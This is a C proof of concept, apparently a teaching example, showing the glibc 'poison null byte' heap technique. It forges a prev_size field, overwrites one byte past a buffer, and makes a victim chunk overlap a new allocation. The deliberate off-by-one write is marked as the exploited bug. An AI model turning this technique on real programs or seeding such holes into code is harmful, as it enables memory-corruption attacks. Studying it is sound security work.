
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>
int main()
{
	uint8_t *a;
	uint8_t *b;
	uint8_t *c;
	uint8_t *b1;
	uint8_t *b2;
	uint8_t *d;
	void *barrier;
	a = (uint8_t *)malloc(0x500);
	int real_a_size = malloc_usable_size(a);
	/* chunk size attribute cannot have a least significant byte with a value of 0x00.
	 * the least significant byte of this will be 0x10, because the size of the chunk includes
	 * the amount requested plus some amount required for the metadata. */
	b = (uint8_t *)malloc(0xa00);
	c = (uint8_t *)malloc(0x500);
	barrier = malloc(0x100);
	uint64_t *b_size_ptr = (uint64_t *)(b - 8);
	// added fix for size==prev_size(next_chunk) check in newer versions of glibc
	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
	// this added check requires we are allowed to have null pointers in b (not just a c string)
	//*(size_t*)(b+0x9f0) = 0xa00;
	// we set this location to 0xa00 since 0xa00 == (0xa11 & 0xff00)
	// which is the value of b.size after its first byte has been overwritten with a NULL byte
	*(size_t *)(b + 0x9f0) = 0xa00;
	// this technique works by overwriting the size metadata of a free chunk
	free(b);
	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
	uint64_t *c_prev_size_ptr = ((uint64_t *)c) - 2;
	// This malloc will result in a call to unlink on the chunk where b was.
	// The added check (commit id: 17f487b), if not properly handled as we did before,
	// will detect the heap corruption now.
	// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
	// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0xa00 (was 0xa10 before the overflow)
	// next_chunk(P) == b-0x10+0xa00 == b+0x9f0
	// prev_size (next_chunk(P)) == *(b+0x9f0) == 0xa00
	b1 = malloc(0x500);
	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control
	b2 = malloc(0x480);
	memset(b2, 'B', 0x480);
	free(b1);
	free(c);
	d = malloc(0xc00);
	memset(d, 'D', 0xc00);
	assert(strstr(b2, "DDDDDDDDDDDD"));
}
